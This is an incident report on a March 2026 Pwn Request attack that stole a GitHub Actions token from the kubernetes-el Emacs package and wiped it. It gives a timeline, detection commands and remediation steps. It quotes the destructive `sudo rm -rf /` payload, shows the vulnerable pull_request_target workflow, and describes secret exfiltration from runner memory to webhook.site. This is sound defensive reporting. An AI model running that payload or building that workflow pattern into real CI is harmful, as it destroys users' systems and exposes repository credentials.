# kubernetes-el Pwn Request: Emacs Package Defaced and Destroyed

**Date:** March 2026
**Ecosystem:** GitHub Actions / Emacs (MELPA)
**Severity:** High
**Type:** Pwn Request / CI/CD token theft / Repository defacement / Destructive payload
**Sources:**
- [StepSecurity — kubernetes-el Compromised: How a Pwn Request Exploited a Popular Emacs Package](https://www.stepsecurity.io/blog/kubernetes-el-compromised-how-a-pwn-request-exploited-a-popular-emacs-package)

---

## Summary

On March 5, 2026, a threat actor exploited a classic "Pwn Request" vulnerability in the CI workflow of `kubernetes-el/kubernetes-el` — a popular Emacs package for managing Kubernetes clusters. Using a freshly-created GitHub account (`quicktrinny`, created just one day before the attack), the attacker opened PR #382 to trigger a `pull_request_target` workflow that checked out fork code and ran `make build`. Through 6 iterative commits, the attacker refined their memory-dumping payload, ultimately exfiltrating the repository's GITHUB_TOKEN with full write permissions.

The stolen token was then used to push 4 malicious commits directly to the master branch, defacing the README and — most critically — replacing `kubernetes.el` (the package's main entry point) with `(shell-command-to-string "sudo rm -rf / || rm -rf / || sudo rm -rf / --no-preserve-root")`. Any Emacs user who updated after this commit would have had this destructive command executed on their system. The package was removed from MELPA and blocked on the Emacsmirror within days.

---

## Compromised Artifacts

| Repository | Impact |
|-----------|--------|
| `kubernetes-el/kubernetes-el` (MELPA Emacs package) | Repository defaced; package file replaced with destructive `rm -rf /` command; removed from MELPA |

---

## How It Worked

### The Vulnerable Workflow

The repository's `.github/workflows/ci.yaml` combined two critical misconfigurations:

```yaml
on:
  pull_request_target:    # Runs with target repo's GITHUB_TOKEN (write permissions)
    ...
steps:
  - uses: actions/checkout@v6
    with:
      ref: ${{ github.event.pull_request.head.sha }}  # BUT checks out attacker's fork code
  - run: make build       # Executes attacker's Makefile
```

`pull_request_target` grants the target repository's secrets/token, while the explicit `ref:` override fetches and executes attacker-controlled code — the classic Pwn Request pattern.

### Iterative Exploit Development (6 Commits)

The attacker iterated across 3 workflow runs over ~50 minutes, progressively refining the exploit:

1. **Commit 1** — Hijacked `Makefile` build target to execute `funny.sh`
2. **Commit 2** — Initial `funny.sh`: memory dump via Gist-hosted script, exfiltrate GITHUB_TOKEN to `webhook.site`
3. **Commit 3** — Switched memory dump source to `AdnaneKhan/Cacheract` (a known CI/CD research tool)
4. **Commit 4** — Fixed Makefile tab indentation (spaces broke `make`)
5. **Commit 5** — Escalated: extract ALL secrets matching `{"value":"...","isSecret":true}` from runner memory
6. **Commit 6** — Final payload confirmed successful; 350-byte upload to webhook.site exfiltration endpoint confirmed in build log

### Repository Destruction

With the stolen GITHUB_TOKEN, the attacker pushed 4 commits directly to master in 17 minutes:

| Time (UTC) | Commit | Action |
|-----------|--------|--------|
| 04:30 | `929c639` | Defaced `Readme.md` — replaced with "HACKED BY DICK LONG" |
| 04:32 | `09e06af` | Replaced `kubernetes.el` with `(shell-command-to-string "sudo rm -rf /...")` |
| 04:33 | `b27498c` | Repeated destructive commit |
| 04:47 | `c084b10` | Deleted nearly all repository files |

The commits appeared under `github-actions[bot]` identity because the stolen GITHUB_TOKEN is associated with that account — making them appear to come from an automated process.

---

## Timeline

| Date/Time (UTC) | Event |
|-----------------|-------|
| 2026-03-04 ~00:13 | GitHub account `quicktrinny` created |
| 2026-03-05 03:40 | Attacker modifies Makefile in fork |
| 2026-03-05 03:41 | Creates `funny.sh` with memory dump and exfiltration payload |
| 2026-03-05 04:17 | Opens PR #382; first workflow run fails (Makefile tab issue) |
| 2026-03-05 04:26 | Second workflow run succeeds — secrets exfiltrated |
| 2026-03-05 04:28 | Third workflow run succeeds — secrets exfiltrated again |
| 2026-03-05 04:30 | README defaced |
| 2026-03-05 04:32 | `kubernetes.el` replaced with destructive payload |
| 2026-03-05 04:47 | Most repository files deleted |
| 2026-03-05 05:28 | PR #382 closed |
| 2026-03-07 19:02 | Compromise discovered and reported by `tarsius` (Jonas Bernoulli, Emacsmirror maintainer) |
| 2026-03-07 | Package removed from MELPA; blocked on Emacsmirror |

---

## Detection

```bash
# Check for pull_request_target + untrusted checkout patterns in all workflows
grep -rn "pull_request_target" .github/workflows/ | while read -r line; do
  file=$(echo "$line" | cut -d: -f1)
  if grep -q "github.event.pull_request.head" "$file"; then
    echo "DANGEROUS PATTERN in $file: pull_request_target + fork checkout"
  fi
done

# Audit GITHUB_TOKEN permissions declared in workflow files
grep -rn "permissions:" .github/workflows/
grep -rn "contents: write" .github/workflows/

# Check for outbound calls to webhook.site in GitHub Actions logs
grep "webhook.site" ~/.github/ 2>/dev/null

# Review recent force-pushes to default branch via GitHub Events API
# (requires authentication)
curl -H "Authorization: Bearer $GITHUB_TOKEN" \
  "https://api.github.com/repos/OWNER/REPO/events" | \
  jq '.[] | select(.type == "PushEvent") | select(.payload.forced == true)'

# For Emacs users: verify kubernetes.el content before loading
head -5 ~/.emacs.d/elpa/kubernetes-*/kubernetes.el 2>/dev/null | grep -v "shell-command"
```

---

## Remediation

1. **For Emacs users**: if `kubernetes-el` was updated or installed between March 5–7, 2026, immediately inspect `kubernetes.el` for `shell-command-to-string` or `rm -rf` content before loading Emacs. Remove the package entirely and reinstall from a trusted source.
2. **For repository maintainers**: replace `pull_request_target` with `pull_request` in CI workflows that execute code from the PR branch. If `pull_request_target` is required, use a two-workflow pattern (build in `pull_request`, privileged operations in `workflow_run`).
3. **Restrict `GITHUB_TOKEN` permissions** at the workflow level:
   ```yaml
   permissions:
     contents: read
   ```
4. **Monitor network egress** from CI runners — the exfiltration to `webhook.site` would have been flagged by any egress monitoring tool.
5. **Never run `make` or arbitrary shell commands** in a `pull_request_target` workflow that checks out fork code.

---

## Lessons Learned

- A Pwn Request attack can be executed by a brand-new (1-day-old) GitHub account with zero followers — contributor history is not a reliable trust signal for automated workflows.
- Iterative exploit refinement across multiple commits and workflow runs is a standard attacker technique — a single failed attempt does not indicate the attack was deterred.
- Destructive payloads (replacing package code with `rm -rf /`) represent a distinct threat model from credential-stealing attacks: even users with no secrets in CI environments are at risk.
- The `github-actions[bot]` identity can be weaponized by stolen GITHUB_TOKEN to make attacker-controlled commits appear to come from trusted automation.
- Prompt removal from package registries (MELPA, Emacsmirror) within days significantly limited the blast radius; rapid ecosystem response is a critical mitigation layer.

---

## Related Incidents

- [./2026-02-hackerbot-claw.md](./2026-02-hackerbot-claw.md) — hackerbot-claw campaign used the same Pwn Request technique against multiple targets including Trivy
- [./2025-03-tj-actions.md](./2025-03-tj-actions.md) — tj-actions compromise traced back to stolen PAT via similar workflow vulnerability
